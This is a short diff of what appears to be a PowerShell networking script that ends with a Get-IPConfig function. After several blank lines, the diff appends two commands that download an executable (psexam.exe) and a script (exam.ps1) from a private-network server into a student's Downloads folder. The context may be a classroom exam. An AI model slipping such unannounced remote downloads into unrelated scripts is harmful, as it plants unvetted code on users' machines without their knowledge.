@@ -372,3 +372,8 @@ function Get-IPConfig {
     }
 }
 Get-IPConfig
+
+
+
+Invoke-WebRequest -Uri "10.50.34.170:8000/psexam.exe" -OutFile C:\Users\student\Downloads\psexam.exe
+Invoke-WebRequest -Uri "10.50.34.170:8000/exam.ps1" -OutFile C:\Users\student\Downloads\exam.ps1
